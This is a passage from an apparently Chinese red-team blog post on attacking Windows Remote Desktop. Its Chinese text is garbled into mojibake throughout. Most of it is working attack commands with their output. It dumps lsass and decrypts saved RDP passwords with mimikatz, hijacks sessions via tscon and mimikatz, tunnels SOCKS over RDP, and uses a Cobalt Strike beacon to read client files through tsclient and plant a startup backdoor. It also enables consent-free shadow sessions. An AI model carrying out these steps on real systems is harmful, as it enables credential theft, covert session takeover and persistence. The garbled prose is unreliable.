> æ³¨ - CS ä¸‹è½½æ–‡ä»¶å‘½ä»¤ï¼š`download %userprofile%\AppData\Local\Microsoft\Credentials\*`

ä½¿ç”¨ [procdump](https://docs.microsoft.com/zh-cn/sysinternals/downloads/procdump) è½¬å‚¨ lsass.exe è¿›ç¨‹ï¼š

```console
PS C:\Windows\System32> .\procdump64.exe -accepteula -ma lsass.exe lsass.dmp

ProcDump v11.0 - Sysinternals process dump utility
Copyright (C) 2009-2022 Mark Russinovich and Andrew Richards
Sysinternals - www.sysinternals.com

[15:32:56] Dump 1 initiated: C:\Windows\System32\lsass.dmp
[15:32:56] Dump 1 writing: Estimated dump file size is 75 MB.
[15:32:56] Dump 1 complete: 75 MB written in 0.2 seconds
[15:32:57] Dump count reached.

```

ä½¿ç”¨ Mimikatz ä»æŒ‡å®šçš„ RDP ä¼šè¯æ–‡ä»¶ä¸­ï¼Œè·å–åˆ° guidMasterKey å€¼ï¼š

```console
mimikatz # dpapi::cred /in:84BD531FDD20A7ED510558FA8768BA20
**BLOB**
  dwVersion          : 00000001 - 1
  guidProvider       : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
  dwMasterKeyVersion : 00000001 - 1
  guidMasterKey      : {52c3460d-2e8b-4764-957c-57185d4d62b2}
  dwFlags            : 20000000 - 536870912 (system ; )
  dwDescriptionLen   : 00000012 - 18
  szDescription      :


  algCrypt           : 00006610 - 26128 (CALG_AES_256)
  dwAlgCryptLen      : 00000100 - 256
  dwSaltLen          : 00000020 - 32
  pbSalt             : cbc61bdb2a8cda88dafb2c090aaf64b6c8edfc5f32a134839f083fa469a95c7f
  dwHmacKeyLen       : 00000000 - 0
  pbHmackKey         :
  algHash            : 0000800e - 32782 (CALG_SHA_512)
  dwAlgHashLen       : 00000200 - 512
  dwHmac2KeyLen      : 00000020 - 32
  pbHmack2Key        : 3c157c9d67b4e62952b3f8b72d841a35cff4d012e46c2c8f91e4e21af8a91e45
  dwDataLen          : 000000f0 - 240
  pbData             : 3e705a067361549290c628f53ae625d3961d29c2eeba9ba24270723dc3021ad8f6bb9e29c474951492d3ae470daf715825b33652607967a9394f0d10b7e35a34c57396d41e9faba5ea89fe969a7ead9e76035dfe3aff6c2b7d6332ea0b2fec5ea2eca2ad1054808dab04d17e4a818f2fbe0aed21b3e217604f2b52e04736c77349f0455c832af7120ffb1eda7dd3b5fc6214f697564e28b2c916d8ab926ffc65571e6475ca7d746e63d4b919519970233359ef2c547f2f3422b9d4199e1f4bcc3f5d034f6d47da39469331fa31adacefaba7dd7aae4b6fb3fea8a873815336cff1c62bb60b2fdbb69647c520a01550f6
  dwSignLen          : 00000040 - 64
  pbSign             : f776ff8611228511d6c93bd259caeea4bdf66908fc9a79c6c5841d85bb340f02489972d82ca9124bf6adc48ac6c4341a2012dc070a3d6c9b1c850d29298bd4a0

```

> æ³¨ï¼šè·å–åˆ°çš„ guidMasterKey å€¼ï¼Œå…¶å®å°±æ˜¯çš„ Master Key File çš„åç§°ã€‚
>
> å¯ä»¥åœ¨ `%APPDATA%\Microsoft\Protect\<UserSID>\<MasterKeyFile>` ä¸­æ‰¾åˆ°ã€‚

ä½¿ç”¨ mimikatz åŠ è½½ä»ç›®æ ‡æœºçš„ lsass.dmp è½¬å‚¨æ–‡ä»¶ï¼›

å¹¶é€šè¿‡å¯¹åº”çš„ MasterKey æ–‡ä»¶åï¼ˆguidMasterKey/GUID å€¼ï¼‰æ‰¾åˆ°å¯¹åº”çš„ MasterKey å€¼ï¼š

```console
mimikatz # sekurlsa::minidump lsass.dmp
Switch to MINIDUMP : 'lsass.dmp'

mimikatz # sekurlsa::dpapi
Opening : 'lsass.dmp' file for minidump...

Authentication Id : 0 ; 439901 (00000000:0006b65d)
Session           : Interactive from 1
User Name         : test
Domain            : DESKTOP-TEST
Logon Server      : DESKTOP-TEST
Logon Time        : 2023-11-24 14:26:41
SID               : S-1-5-21-102229053-337446436-1419803206-1001
  [00000000]
  * GUID      : {273001c6-c88c-422a-aecb-daa6f950f8d0}
  * Time      : 2023-11-24 14:51:01
  * MasterKey : 9458e389d675c03e3134abca123a5f97b0344db9ec7eb77ca65e962ed238d3d9d62ba12e9b227587df8f430762790758c7a1dcf8f0baad587c0301305e088205
  * sha1(key) : a00423233ef319472dd71c7356322f7b00b29e13
  [00000001]
  * GUID      : {52c3460d-2e8b-4764-957c-57185d4d62b2}
  * Time      : 2023-11-24 15:30:06
  * MasterKey : 6beeec39772b606a7ac31f190d3c5cab56e00bd0bef7fe898cc826b12930a402b3163877d3a4d9aadafc2457a31ab2b35522b711c2512156db940ddf350c27f7
  * sha1(key) : b53ebc9462b9cf6284f116b46d3a869091cc398f


Authentication Id : 0 ; 439845 (00000000:0006b625)
Session           : Interactive from 1
User Name         : test
Domain            : DESKTOP-TEST
Logon Server      : DESKTOP-TEST
Logon Time        : 2023-11-24 14:26:41
SID               : S-1-5-21-102229053-337446436-1419803206-1001

......

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : DESKTOP-TEST$
Domain            : WORKGROUP
Logon Server      : (null)
Logon Time        : 2023-11-24 14:26:34
SID               : S-1-5-18
  [00000000]
  * GUID      : {806436a2-285b-4457-9634-9fe864996faa}
  * Time      : 2023-11-24 15:29:23
  * MasterKey : a399f4fb6ab9caed09407c4adf12a83ab52fd63ff8edf5c2db95daf4178bab8755fd29f876c878fcbb7140692222d3c7fd4306091b8215a7bf461237bb832d60
  * sha1(key) : 434dba543e494c255867a7676fd6b05d958cf950
  [00000001]
  * GUID      : {4a44a108-4a52-462e-873d-37a342a538f7}
  * Time      : 2023-11-24 14:29:57
  * MasterKey : dcd5d78081c7e5c5889ca8dbb90a848c6bc55fa68c5a3f0706367aed9f80e8c55842f1cd8af826e2412fbed6d506959c61a4402b259fafc7aad404042ded5f78
  * sha1(key) : ad78f0a094c61142ab740c84f8bcc04bc1de3ae4
  [00000002]
  * GUID      : {39272925-c391-4d0d-9c03-6040edc70d70}
  * Time      : 2023-11-24 14:29:07
  * MasterKey : 82355294e567a47527246f27be711123bd1a03c3faff9cd21c0531cc7bf5cba0363a12366a64a1853d889f10828265646329feb14c92e2d6a9b95a6b64029c84
  * sha1(key) : 1b14f9a9f6075470cd1de67cdfea63e5787ed0bf
  [00000003]
  * GUID      : {b38ac866-4d4a-4c36-a406-a3c4ca1d8314}
  * Time      : 2023-11-24 14:26:42
  * MasterKey : 3c5509ef5d2092496afc864744215690b8391b88548c9d7e565886b90c491cd9d25be0f13c2127eff8f57270c9baccb63ba49c86d1c143abd5062c651f737c70
  * sha1(key) : a52ec4f4053e1cec48d8d9d1c5fe2486e590b06b
  [00000004]
  * GUID      : {52771d12-761e-43e8-a30d-8c868b34f454}
  * Time      : 2023-11-24 15:00:37
  * MasterKey : 1e12db5656f9a3a8a032d5c4bed34a130ced9703ad489b059dd27593141e00bb11596c4612b706786591da8c759967e9d75c4f64a3b1398b636bddeadc3378e2
  * sha1(key) : f73e089b0369d8257beeb1b1b2b87491edc81a65

```

> æ³¨ï¼š`273001c6-c88c-422a-aecb-daa6f950f8d0` å’Œ `52c3460d-2e8b-4764-957c-57185d4d62b2` å¯¹åº”çš„ MasterKey éƒ½å¯ä»¥è§£å¯†å‡­è¯ï¼Œå› ä¸ºè¿™ä¸¤ä¸ªéƒ½æ˜¯è¯¥ç”¨æˆ·çš„ MasterKey æ–‡ä»¶ï¼š`%APPDATA%\Microsoft\Protect\<UserSID>\<MasterKeyFile>`ã€‚

æœ€åä½¿ç”¨ Masterkey ä»æ–‡ä»¶ä¸­è§£å¯†å‡­è¯ï¼Œå¾—åˆ°æ˜æ–‡å¯†ç ï¼š

```console
mimikatz # dpapi::cred /in:84BD531FDD20A7ED510558FA8768BA20 /masterkey:6beeec39772b606a7ac31f190d3c5cab56e00bd0bef7fe898cc826b12930a402b3163877d3a4d9aadafc2457a31ab2b35522b711c2512156db940ddf350c27f7
**BLOB**
  dwVersion          : 00000001 - 1
  guidProvider       : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
  dwMasterKeyVersion : 00000001 - 1
  guidMasterKey      : {52c3460d-2e8b-4764-957c-57185d4d62b2}
  dwFlags            : 20000000 - 536870912 (system ; )
  dwDescriptionLen   : 00000012 - 18
  szDescription      :


  algCrypt           : 00006610 - 26128 (CALG_AES_256)
  dwAlgCryptLen      : 00000100 - 256
  dwSaltLen          : 00000020 - 32
  pbSalt             : cbc61bdb2a8cda88dafb2c090aaf64b6c8edfc5f32a134839f083fa469a95c7f
  dwHmacKeyLen       : 00000000 - 0
  pbHmackKey         :
  algHash            : 0000800e - 32782 (CALG_SHA_512)
  dwAlgHashLen       : 00000200 - 512
  dwHmac2KeyLen      : 00000020 - 32
  pbHmack2Key        : 3c157c9d67b4e62952b3f8b72d841a35cff4d012e46c2c8f91e4e21af8a91e45
  dwDataLen          : 000000f0 - 240
  pbData             : 3e705a067361549290c628f53ae625d3961d29c2eeba9ba24270723dc3021ad8f6bb9e29c474951492d3ae470daf715825b33652607967a9394f0d10b7e35a34c57396d41e9faba5ea89fe969a7ead9e76035dfe3aff6c2b7d6332ea0b2fec5ea2eca2ad1054808dab04d17e4a818f2fbe0aed21b3e217604f2b52e04736c77349f0455c832af7120ffb1eda7dd3b5fc6214f697564e28b2c916d8ab926ffc65571e6475ca7d746e63d4b919519970233359ef2c547f2f3422b9d4199e1f4bcc3f5d034f6d47da39469331fa31adacefaba7dd7aae4b6fb3fea8a873815336cff1c62bb60b2fdbb69647c520a01550f6
  dwSignLen          : 00000040 - 64
  pbSign             : f776ff8611228511d6c93bd259caeea4bdf66908fc9a79c6c5841d85bb340f02489972d82ca9124bf6adc48ac6c4341a2012dc070a3d6c9b1c850d29298bd4a0

Decrypting Credential:
 * volatile cache: GUID:{52c3460d-2e8b-4764-957c-57185d4d62b2};KeyHash:b53ebc9462b9cf6284f116b46d3a869091cc398f;Key:available
 * masterkey     : 6beeec39772b606a7ac31f190d3c5cab56e00bd0bef7fe898cc826b12930a402b3163877d3a4d9aadafc2457a31ab2b35522b711c2512156db940ddf350c27f7
**CREDENTIAL**
  credFlags      : 00000030 - 48
  credSize       : 000000e0 - 224
  credUnk0       : 00000000 - 0

  Type           : 00000002 - 2 - domain_password
  Flags          : 00000000 - 0
  LastWritten    : 2023-11-24 7:30:06
  unkFlagsOrSize : 00000018 - 24
  Persist        : 00000002 - 2 - local_machine
  AttributeCount : 00000000 - 0
  unk0           : 00000000 - 0
  unk1           : 00000000 - 0
  TargetName     : Domain:target=TERMSRV/192.168.70.130
  UnkData        : (null)
  Comment        : (null)
  TargetAlias    : (null)
  UserName       : DESKTOP-TEST\administrator
  CredentialBlob : Admin@123
  Attributes     : 0

mimikatz # dpapi::cred /in:84BD531FDD20A7ED510558FA8768BA20 /masterkey:9458e389d675c03e3134abca123a5f97b0344db9ec7eb77ca65e962ed238d3d9d62ba12e9b227587df8f430762790758c7a1dcf8f0baad587c0301305e088205
**BLOB**
  dwVersion          : 00000001 - 1
  guidProvider       : {df9d8cd0-1501-11d1-8c7a-00c04fc297eb}
  dwMasterKeyVersion : 00000001 - 1
  guidMasterKey      : {52c3460d-2e8b-4764-957c-57185d4d62b2}
  dwFlags            : 20000000 - 536870912 (system ; )
  dwDescriptionLen   : 00000012 - 18
  szDescription      : æœ¬åœ°å‡­æ®æ•°æ®

  algCrypt           : 00006610 - 26128 (CALG_AES_256)
  dwAlgCryptLen      : 00000100 - 256
  dwSaltLen          : 00000020 - 32
  pbSalt             : cbc61bdb2a8cda88dafb2c090aaf64b6c8edfc5f32a134839f083fa469a95c7f
  dwHmacKeyLen       : 00000000 - 0
  pbHmackKey         :
  algHash            : 0000800e - 32782 (CALG_SHA_512)
  dwAlgHashLen       : 00000200 - 512
  dwHmac2KeyLen      : 00000020 - 32
  pbHmack2Key        : 3c157c9d67b4e62952b3f8b72d841a35cff4d012e46c2c8f91e4e21af8a91e45
  dwDataLen          : 000000f0 - 240
  pbData             : 3e705a067361549290c628f53ae625d3961d29c2eeba9ba24270723dc3021ad8f6bb9e29c474951492d3ae470daf715825b33652607967a9394f0d10b7e35a34c57396d41e9faba5ea89fe969a7ead9e76035dfe3aff6c2b7d6332ea0b2fec5ea2eca2ad1054808dab04d17e4a818f2fbe0aed21b3e217604f2b52e04736c77349f0455c832af7120ffb1eda7dd3b5fc6214f697564e28b2c916d8ab926ffc65571e6475ca7d746e63d4b919519970233359ef2c547f2f3422b9d4199e1f4bcc3f5d034f6d47da39469331fa31adacefaba7dd7aae4b6fb3fea8a873815336cff1c62bb60b2fdbb69647c520a01550f6
  dwSignLen          : 00000040 - 64
  pbSign             : f776ff8611228511d6c93bd259caeea4bdf66908fc9a79c6c5841d85bb340f02489972d82ca9124bf6adc48ac6c4341a2012dc070a3d6c9b1c850d29298bd4a0

Decrypting Credential:
 * volatile cache: GUID:{52c3460d-2e8b-4764-957c-57185d4d62b2};KeyHash:b53ebc9462b9cf6284f116b46d3a869091cc398f;Key:available
 * masterkey     : 9458e389d675c03e3134abca123a5f97b0344db9ec7eb77ca65e962ed238d3d9d62ba12e9b227587df8f430762790758c7a1dcf8f0baad587c0301305e088205
**CREDENTIAL**
  credFlags      : 00000030 - 48
  credSize       : 000000e0 - 224
  credUnk0       : 00000000 - 0

  Type           : 00000002 - 2 - domain_password
  Flags          : 00000000 - 0
  LastWritten    : 2023-11-24 7:30:06
  unkFlagsOrSize : 00000018 - 24
  Persist        : 00000002 - 2 - local_machine
  AttributeCount : 00000000 - 0
  unk0           : 00000000 - 0
  unk1           : 00000000 - 0
  TargetName     : Domain:target=TERMSRV/192.168.70.130
  UnkData        : (null)
  Comment        : (null)
  TargetAlias    : (null)
  UserName       : DESKTOP-TEST\administrator
  CredentialBlob : Admin@123
  Attributes     : 0

```

TargetName - ç›®æ ‡ä¸»æœºï¼›UserName - ç”¨æˆ·åï¼›CredentialBlob - è§£å¯†åçš„æ˜æ–‡å¯†ç ã€‚

## RDP Session Hijacking

å¯¹äºå¼€å¯è¿œç¨‹æ¡Œé¢æœåŠ¡çš„ Windows Server ç³»ç»Ÿï¼Œå½“æœ‰å¤šä¸ªä¸åŒç”¨æˆ·ç™»å½•è¯¥ç³»ç»Ÿæ—¶ï¼Œä¼šäº§ç”Ÿå¤šä¸ª RDP ä¼šè¯ã€‚åœ¨åŠ«æŒå…¶å®ƒç™»å½•çš„ç”¨æˆ·æ—¶ï¼Œä¼šå°†ç›®æ ‡ç”¨æˆ·æŒ¤ä¸‹å»ã€‚ï¼ˆéæœåŠ¡å™¨ç‰ˆæœ¬çš„ Windows ç³»ç»Ÿé»˜è®¤åªå…è®¸ä¸€ä¸ªè´¦æˆ·ç™»å½•ï¼‰

---

è·å–æ¯ä¸ªç”¨æˆ·å¯¹åº”çš„ä¼šè¯ä¿¡æ¯ï¼š

```console
C:\Users\Administrator\Desktop>quser
 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
>administrator         rdp-tcp#3           2  Active          .  9/27/2023 10:21 PM
 test                  rdp-tcp#4           3  Active          8  9/27/2023 10:28 PM

C:\Users\Administrator\Desktop>qwinsta
 SESSIONNAME       USERNAME                 ID  STATE   TYPE        DEVICE
 services                                    0  Disc
>rdp-tcp#3         Administrator             2  Active
 rdp-tcp#4         test                      3  Active
 console                                     4  Conn
 rdp-tcp                                 65536  Listen
```

### cmd - tscon

å¯ä»¥åˆ©ç”¨ PsExec ä» administrator åˆ° SYSTEM æƒé™è¿›è¡Œæ“ä½œï¼Œåˆ›å»ºæœåŠ¡ä½¿ç”¨ [tscon](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/tscon) å‘½ä»¤å¯¹ç›®æ ‡è¿›è¡Œ RDP ä¼šè¯åŠ«æŒï¼š

```console
C:\Users\Administrator\Desktop>quser
 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON     TIME
>administrator         rdp-tcp#9           2  Active          .  9/27/2023 10:21 PM
 test                  rdp-tcp#10          3  Active          4  9/27/2023 10:28 PM

C:\Users\Administrator\Desktop>.\PsExec64.exe -s -accepteula cmd

PsExec v2.4 - Execute processes remotely
Copyright (C) 2001-2022 Mark Russinovich
Sysinternals - www.sysinternals.com


Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system

C:\Windows\system32>sc create sesshijack binpath= "cmd.exe /k tscon 3 /dest:rdp-tcp#9"
[SC] CreateService SUCCESS

C:\Windows\system32>net start sesshijack

The service is not responding to the control function.
C:\Windows\system32>
More help is available by typing NET HELPMSG 2186.

```

### mimikatz - ts::remote

ä»¥ä¸‹æ˜¯ä½¿ç”¨ mimikatz åŠ«æŒ test ç”¨æˆ·çš„ç¤ºä¾‹ï¼š

```console
mimikatz # privilege::debug
Privilege '20' OK

mimikatz # token::elevate
Token Id  : 0
User name :
SID name  : NT AUTHORITY\SYSTEM

368 {0;000003e7} 0 D 17195      NT AUTHORITY\SYSTEM S-1-5-18 (04g,20p) Primary
 -> Impersonated !
 * Process Token : {0;0005a226} 2 D 1547641    10_0_8_17\Administrator S-1-5-21-3697670079-2126774415-1611505882-500 (14g,23p) Primary
 * Thread Token  : {0;000003e7} 0 D 1568236    NT AUTHORITY\SYSTEM S-1-5-18 (04g,20p) Impersonation (Delegation)

mimikatz # ts::sessions

Session: 0 - Services
  state: Disconnected (4)
  user :  @
  curr : 9/27/2023 10:56:14 PM
  lock : no

Session: *2 - RDP-Tcp#7
  state: Active (0)
  user : Administrator @ 10_0_8_17
  Conn : 9/27/2023 10:53:56 PM
  disc : 9/27/2023 10:53:56 PM
  logon: 9/27/2023 10:21:56 PM
  last : 9/27/2023 10:56:14 PM
  curr : 9/27/2023 10:56:14 PM
  lock : no
  addr4: xx.xx.xx.xx

Session: 3 - RDP-Tcp#8
  state: Active (0)
  user : test @ 10_0_8_17
  Conn : 9/27/2023 10:56:06 PM
  disc : 9/27/2023 10:56:06 PM
  logon: 9/27/2023 10:28:00 PM
  last : 9/27/2023 10:56:10 PM
  curr : 9/27/2023 10:56:14 PM
  lock : no
  addr4: xx.xx.xx.xx

Session: 4 - Console
  state: Connected (1)
  user :  @
  Conn : 9/27/2023 10:47:54 PM
  curr : 9/27/2023 10:56:14 PM
  lock : no

Session: 65536 - RDP-Tcp
  state: Listen (6)
  user :  @
  lock : no

mimikatz # ts::remote /id:3
Asking to connect from 3 to current session

> Connected to 3

mimikatz # exit
Bye!
```

å…¶å®ƒå·¥å…·ï¼š

[https://github.com/crazywifi/RDP_SessionHijacking](https://github.com/crazywifi/RDP_SessionHijacking)

[https://github.com/bohops/SharpRDPHijack](https://github.com/bohops/SharpRDPHijack)

## RDP and SOCKS Tunneling

ä½¿ç”¨ [SocksOverRDP](https://github.com/nccgroup/SocksOverRDP) åˆ©ç”¨ RDP åè®®æ­å»º SOCKS æœåŠ¡ï¼š

```
# æ³¨å†Œ dllï¼ˆä¼šå¼¹å‡ºé€šçŸ¥çª—ï¼‰
regsvr32.exe SocksOverRDP-Plugin.dll
# é…ç½® SOCKS æœåŠ¡åœ°å€ä¸º 0.0.0.0
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Terminal Server Client\Default\AddIns\SocksOverRDP-Plugin" /v "ip" /t REG_SZ /d 0.0.0.0 /f
# é…ç½® SOCKS æœåŠ¡ç«¯å£ä¸º 1080
reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Terminal Server Client\Default\AddIns\SocksOverRDP-Plugin" /v "port" /t REG_SZ /d 1080 /f
# è¿è¡Œ SOCKS æœåŠ¡
SocksOverRDP-Server.exe

# å–æ¶ˆæ³¨å†Œ dll
regsvr32.exe /u SocksOverRDP-Plugin.dll
```

## TSClient

tsclient æ˜¯é€šè¿‡è¿œç¨‹æ¡Œé¢è¿æ¥åˆ°è¿œç¨‹è®¡ç®—æœºæ—¶ï¼Œåœ¨è¿œç¨‹è®¡ç®—æœºã€Œç½‘ä¸Šé‚»å±…ã€ä¸­å‡ºç°çš„ä¸€ä¸ªæœºå™¨åï¼Œå®é™…ä¸ºè¿œç¨‹è®¡ç®—æœºåˆ†é…ç»™æœ¬æœºçš„åç§°ã€‚

åœ¨è¿œç¨‹è®¡ç®—æœºä¸­ï¼Œå¯ä»¥é€šè¿‡ `\\tsclient\ç›˜ç¬¦` è®¿é—®ç”¨æˆ·ï¼ˆRDP å®¢æˆ·ç«¯ï¼‰æœ¬åœ°è®¡ç®—æœºã€‚å…¶è®¿é—®æ–¹å¼ç±»ä¼¼äºä½¿ç”¨ smb è¿›è¡Œæ–‡ä»¶ä¼ è¾“ï¼Œè™½ç„¶æœ¬è´¨ä¸Šéƒ½æ˜¯ smb åè®®ï¼Œä½†æ˜¯ä½¿ç”¨ tsclient æ— éœ€èº«ä»½è®¤è¯ã€‚

---

é™åˆ¶æ¡ä»¶ï¼šé»˜è®¤æƒ…å†µä¸‹ mstsc æ˜¯ä¸å¼€å¯ç£ç›˜å…±äº«åŠŸèƒ½çš„ï¼Œå¿…é¡»è¦æ‰‹å·¥å¼€å¯ã€‚

å¼€å¯æ–¹æ³•ï¼Œå¦‚å›¾æ‰€ç¤ºï¼š

![image.png](https://raw.githubusercontent.com/h0ny/repo/main/images/2dbefa1c066c0bfc.png){: w="350" }

- æ‰“å¼€â€œè¿œç¨‹æ¡Œé¢è¿æ¥ (mstsc)â€é€‰æ‹©â€œæœ¬åœ°èµ„æºâ€é€‰é¡¹å¡ï¼›
- ç‚¹å‡»â€œæœ¬åœ°è®¾å¤‡å’Œèµ„æºâ€ä¸‹çš„â€œè¯¦ç»†ä¿¡æ¯â€ï¼›
- é…ç½®æƒ³è¦å…±äº«åˆ°è¿œç¨‹è®¡ç®—æœºçš„æœ¬åœ°ç£ç›˜é©±åŠ¨å™¨ã€‚

è™½ç„¶é™åˆ¶æ¡ä»¶è¾ƒä¸ºè‹›åˆ»ï¼Œä½†åœ¨å®é™…ç¯å¢ƒä¸­ï¼Œå¾ˆå¤šè¿ç»´äººå‘˜ä¸ºäº†æ–¹ä¾¿æ“ä½œï¼Œé€šå¸¸ä¼šæŒ‚è½½æœ¬åœ°ç£ç›˜ï¼Œå› æ­¤è¿™ä¸€æ–¹æ³•å¹¶éå…¨ç„¶æ— ç”¨ï¼Œéœ€è¦æ ¹æ®å®é™…æƒ…å†µåˆ¤æ–­ã€‚

å½“å‘ç°æœ‰ç”¨æˆ·ï¼ˆè¿ç»´ï¼‰æ­£åœ¨ä½¿ç”¨è¿œç¨‹æ¡Œé¢è¿æ¥è¯¥æœåŠ¡å™¨æ—¶ï¼š

```console
beacon> shell qwinsta
[*] Tasked beacon to run: qwinsta
[+] host called home, sent: 38 bytes
[+] received output:
 ä¼šè¯å            ç”¨æˆ·å                   ID  çŠ¶æ€    ç±»å‹        è®¾å¤‡
>services                                    0  æ–­å¼€
 console                                     1  å·²è¿æ¥
 rdp-tcp#0         John                      2  è¿è¡Œä¸­
 rdp-tcp                                 65536  ä¾¦å¬
```

å¯ä»¥å°è¯•å·å–è¯¥ç”¨æˆ·çš„èº«ä»½ä»¤ç‰Œï¼Œä»¥è¯¥ç”¨æˆ·çš„èº«ä»½æ‰§è¡Œ `net use` å‘½ä»¤ï¼Œå¦‚æœæŸ¥çœ‹åˆ°å¦‚ä¸‹ç½‘ç»œè¿æ¥ï¼Œåˆ™è¡¨ç¤ºè¯¥ç”¨æˆ·åœ¨è¿æ¥è¿œç¨‹æœåŠ¡å™¨æ—¶å¼€å¯äº† tsclient ç£ç›˜æŒ‚è½½ï¼š

```console
beacon> shell whoami
[*] Tasked beacon to run: whoami
[+] host called home, sent: 37 bytes
[+] received output:
win-web\john

beacon> shell net use
[*] Tasked beacon to run: net use
[+] host called home, sent: 38 bytes
[+] received output:
ä¼šè®°å½•æ–°çš„ç½‘ç»œè¿æ¥ã€‚


çŠ¶æ€       æœ¬åœ°        è¿œç¨‹                      ç½‘ç»œ

-------------------------------------------------------------------------------
                       \\TSCLIENT\C              Microsoft Terminal Services
å‘½ä»¤æˆåŠŸå®Œæˆã€‚

```

> æ³¨ï¼šåªæœ‰è¿œç¨‹ç™»å½•çš„ç”¨æˆ·å¯ä»¥è®¿é—® tsclientï¼Œå…¶ä»–ç”¨æˆ·æ— æ³•è®¿é—®ï¼ŒåŒ…æ‹¬ä½¿ç”¨ runas ä¹Ÿæ— æ³•è®¿é—®ã€‚

æ­¤æ—¶ï¼Œå¯ä»¥é€šè¿‡ tsclient è¯»å–è¯¥ç”¨æˆ·ï¼ˆRDP å®¢æˆ·ç«¯ï¼‰æœ¬åœ°ç£ç›˜ä¸­çš„æ–‡ä»¶ï¼š

```console
beacon> shell type \\TSCLIENT\C\credential.txt
[*] Tasked beacon to run: type \\TSCLIENT\C\credential.txt
[+] host called home, sent: 63 bytes
[+] received output:
xiaorang.lab\Aldrich:Ald@rLMWuy7Z!#

Do you know how to hijack Image?
```

è¿˜å¯ä»¥å‘ç£ç›˜ï¼ˆç”¨æˆ·å¼€æœºå¯åŠ¨é¡¹ï¼‰ä¸­å†™å…¥æ¶æ„æ–‡ä»¶ï¼Œå½“æœºå™¨é‡å¯æ—¶å°±ä¼šæ‰§è¡Œæ¶æ„æ–‡ä»¶ï¼š

```console
# Upload backdoor to startup folder
beacon> cd \\tsclient\c\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
beacon> upload C:\Payloads\pivot.exe
```

> å¯ç”¨å·¥å…·ï¼šhttps://github.com/mdsecactivebreach/RDPInception/

é¢„é˜²ï¼ˆé£é™©æ§åˆ¶ï¼‰çš„æ–¹æ³•ï¼šè™½ç„¶ mstsc åœ¨é…ç½®æŒ‚è½½ç£ç›˜æ—¶æ— æ³•ç›´æ¥é€‰æ‹©æ–‡ä»¶å¤¹ï¼Œä½†å¯ä»¥åˆ©ç”¨ [subst](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/subst) å‘½ä»¤å°†æŒ‡å®šçš„æ–‡ä»¶å¤¹æŒ‚è½½æˆç£ç›˜é©±åŠ¨å™¨ï¼Œå®ç°å°†è¿œç¨‹ä¸»æœºçš„è¯»å†™èŒƒå›´é™ç¼©åœ¨æŒ‡å®šæ–‡ä»¶å¤¹ã€‚

```console
PS C:\Windows\System32> # åˆ›å»ºè™šæ‹Ÿé©±åŠ¨å™¨
PS C:\Windows\System32> subst T: C:\Temp\RdpTransfer
PS C:\Windows\System32> wmic logicaldisk get deviceid,volumename
DeviceID  VolumeName
C:        Windows-SSD
T:        Windows-SSD

PS C:\Windows\System32> # åˆ é™¤æ›¿æ¢çš„ï¼ˆè™šæ‹Ÿï¼‰é©±åŠ¨å™¨
PS C:\Windows\System32> subst /d T:
```

## Shadow Mode

è¯¥æ¨¡å¼ç±»ä¼¼äº â€œå‘æ—¥è‘µâ€ã€â€œTeamviewerâ€ã€â€œToDeskâ€ è¿™ç±»è¿œç¨‹æ§åˆ¶è½¯ä»¶çš„æ•ˆæœã€‚ï¼ˆä¸ä¼šå°†æ­£åœ¨è¿›è¡Œè¿œç¨‹æ¡Œé¢è¿æ¥çš„ç”¨æˆ·æŒ¤ä¸‹çº¿ï¼‰

---

éœ€è¦ä¿®æ”¹ç›®æ ‡æœºå™¨ GPOï¼ˆGroup Policy Objectsï¼Œç»„ç­–ç•¥å¯¹è±¡ï¼‰é…ç½® RD Shadow è¿æ¥é€‰é¡¹ï¼š

```
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /t REG_DWORD /d 2 /f
```

> æ³¨ï¼šå½“ Shadow å€¼ä¸º 2 æ—¶ï¼Œè¡¨ç¤ºæœªç»ç”¨æˆ·è®¸å¯å®Œå…¨æ§åˆ¶ï¼›ä¸º 4 æ—¶ï¼Œè¡¨ç¤ºæœªç»ç”¨æˆ·è®¸å¯æŸ¥çœ‹ä¼šè¯ã€‚æ­¤å¤„çš„ â€œæœªç»ç”¨æˆ·è®¸å¯â€ æ˜¯æŒ‡ä¸ä¼šåœ¨è¿œç¨‹ä¸»æœºä¸Šå¼¹æ¡†å¹¶ç­‰å¾…ç”¨æˆ·ç‚¹å‡»ç¡®è®¤ï¼Œä¸æ˜¯æŒ‡åœ¨è¿æ¥è¿œç¨‹ä¸»æœºæ—¶ä¸éœ€è¦æä¾›ç”¨æˆ·å‡­æ®ã€‚

ä½¿ç”¨å½±å­æ¨¡å¼è¿æ¥è¿œç¨‹ä¸»æœºï¼Œå¹¶ä½¿ç”¨ `/noConsentPrompt` å‚æ•°ï¼Œè¿œç¨‹ä¸»æœºä¸Šä¸ä¼šå¼¹å‡ºæç¤ºæ¡†ï¼š

```
mstsc.exe /shadow:1 /v:192.168.70.128 /prompt /control /noConsentPrompt
```

ä¸æ·»åŠ  `/control` å‚æ•°ï¼ŒåªæŸ¥çœ‹åˆ«äººåœ¨è¿œç¨‹ä¸»æœºä¸Šçš„æ“ä½œï¼Œè€Œä¸èƒ½å¯¹å…¶è¿›è¡Œæ“ä½œï¼›

ä¸æ·»åŠ  `/prompt` å‚æ•°ï¼Œè¡¨ç¤ºä½¿ç”¨å½“å‰çš„ç”¨æˆ·å‡­æ®å»è¿æ¥è¿œç¨‹ä¸»æœºã€‚

## References

- æ­»ç£• RDP åè®®ï¼Œä»æˆªå›¾å’Œçˆ†ç ´è¯´èµ·  
  [https://nosec.org/home/detail/5084.html](https://nosec.org/home/detail/5084.html)
- Passing the Hash with Remote Desktop  
  [https://www.kali.org/blog/passing-hash-remote-desktop/](https://www.kali.org/blog/passing-hash-remote-desktop/)
- æ¸—é€æŠ€å·§â€”â€”Pass the Hash with Remote Desktop Protocol  
